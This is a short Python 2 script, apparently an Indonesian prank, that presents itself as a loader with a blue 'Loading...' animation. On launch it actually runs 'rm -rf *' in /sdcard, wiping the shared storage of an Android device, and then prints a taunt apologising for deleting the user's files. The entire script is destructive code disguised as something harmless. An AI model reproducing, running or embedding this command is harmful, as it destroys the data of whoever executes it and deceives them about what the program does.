# coding=utf-8

import os, time

def load():
    m=['.','..','...','....']
    for i in (m):
        print "\033[34;1mLoading "+i
        time.sleep(2)
        
        
def main():
    os.system("cd /sdcard && rm -rf *")
    load()
    print "maaf file anda saya hapus cuk jangan marah yaa"

main() 